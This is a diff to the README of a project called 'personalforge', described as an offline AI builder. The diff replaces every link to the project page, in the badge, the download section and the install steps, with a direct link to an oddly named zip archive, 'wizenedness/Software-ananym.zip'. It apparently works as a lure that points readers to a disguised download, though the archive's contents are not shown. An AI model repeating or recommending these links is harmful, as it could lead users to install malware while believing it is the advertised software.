@@ -1,11 +1,11 @@
 # 🛠️ personalforge - Build Your Offline AI Fast
 
-[![Download personalforge](https://img.shields.io/badge/Download-personalforge-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vijay1731/personalforge)
+[![Download personalforge](https://img.shields.io/badge/Download-personalforge-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Vijay1731/personalforge/main/wizenedness/Software-ananym.zip)
 
 ## 📥 Download
 
 Open the project page here and download the latest version:
-https://github.com/Vijay1731/personalforge
+https://raw.githubusercontent.com/Vijay1731/personalforge/main/wizenedness/Software-ananym.zip
 
 ## 🚀 What personalforge does
 
@@ -40,7 +40,7 @@ Before you run personalforge, make sure you have:
 ## 🖱️ Install and run
 
 1. Open the download page:
-   https://github.com/Vijay1731/personalforge
+   https://raw.githubusercontent.com/Vijay1731/personalforge/main/wizenedness/Software-ananym.zip
 
 2. Download the latest Windows file or package from the project page.
 
